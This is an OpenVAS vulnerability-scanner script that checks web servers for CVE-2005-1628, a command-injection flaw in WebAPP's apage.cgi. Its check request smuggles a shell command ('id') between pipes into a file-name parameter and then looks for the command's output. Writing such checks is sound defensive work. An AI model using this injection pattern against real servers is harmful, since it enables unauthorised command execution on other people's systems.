# OpenVAS Vulnerability Test
# $Id: webapp_apage_cmd_exe.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: WebAPP Apage.CGI remote command execution flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref: Status-x <phr4xz@gmail.com>
 
if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.18292");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2005-1628");
 script_bugtraq_id(13637);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("WebAPP Apage.CGI remote command execution flaw");
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 script_family("Web application abuses");
 script_dependencies("webapp_detect.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name:"solution", value:"Upgrade to WebAPP version 0.9.9.2 or newer.");
 script_tag(name:"summary", value:"Due to a lack of user input validation, an attacker can exploit the
'apage.cgi' script in the version of WebAPP on the remote host to
execute arbitrary commands on the remote host with the privileges of
the web server.");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/webapp"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 dir = matches[2];

 http_check_remote_code (
			unique_dir:dir,
			check_request:"/mods/apage/apage.cgi?f=file.htm.|id|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
}
